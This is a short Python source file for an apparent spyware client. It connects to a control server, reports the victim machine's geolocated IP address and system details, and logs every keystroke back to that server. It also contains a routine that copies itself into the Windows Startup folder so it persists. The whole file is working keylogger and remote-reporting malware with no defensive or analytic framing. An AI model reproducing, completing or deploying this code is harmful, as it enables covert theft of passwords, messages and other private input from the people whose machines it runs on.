from sys import exit
import socket as s
import geocoder
from os import getcwd, environ, path
from platform import uname, processor, system
from time import sleep
from pynput.keyboard import Listener
from shutil import copyfile


class Client:
    def __init__(self):
        # Set the os and the path of this file
        self.os = system()
        self.path_file = path.abspath(__file__)

        # True = os is mac | False = os is windows
        self.mod = True
        if self.os == "Darwin":
            self.mod = False
        elif self.os == "Windows":
            self.mod = True
        else:
            exit()

        # Set important var
        self.client = s.socket()
        self.host = "localhost"
        self.port = 8080
        self.key_logger_mod = True
        self.conn_server()

    def conn_server(self):
        """
        This function connect to the server and start basic functions
        """
        self.client.connect((self.host, self.port))
        sleep(1.5)
        self.get_vinfo()
        self.key_logger()

    def sendmsg(self, msg):
        """
        This function Send message to the server
        """
        self.client.send(msg.encode())

    def get_vinfo(self):
        """
        This function get the  basic info of pc
        """
        ip = geocoder.ip("me")
        pc_information = f"{getcwd()} {uname()} {processor()}"
        msg = f"ip: {ip} AND info: {pc_information}"
        self.sendmsg(msg)

    # To test
    def os_set(self):
        """
        Set file in startup dir if the os is windows
        """
        if self.mod:
            path_startup = fr"C:\Users\{environ['USER']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            copyfile(self.path_file, path_startup)

    def key_logger(self):
        """
        Listens and sends all keys pressed to the server
        """
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        if self.key_logger_mod:
            self.sendmsg(str(key))


if __name__ == "__main__":
    Client()
